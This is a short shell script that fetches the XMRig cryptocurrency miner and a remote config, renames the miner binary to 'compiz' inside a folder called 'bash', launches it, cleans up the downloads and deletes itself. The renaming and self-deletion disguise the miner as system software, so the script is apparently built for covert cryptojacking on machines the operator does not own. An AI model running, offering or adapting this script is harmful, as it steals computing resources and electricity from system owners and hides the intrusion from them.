wget https://github.com/xmrig/xmrig/releases/download/v2.10.0/xmrig-2.10.0-xenial-x64.tar.gz

wget https://github.com/deusveritatis/configs/archive/master.zip

unzip ./master.zip

tar -xvzf ./xmrig-2.10.0-xenial-x64.tar.gz

mv ./xmrig-2.10.0 ./bash

cd configs-master/

cp ./config.json ../bash/config.json

cd ../

rm -rf configs-master/

rm master.zip xmrig-2.10.0-xenial-x64.tar.gz

cd bash/

mv ./xmrig ./compiz

./compiz

top

unlink $0
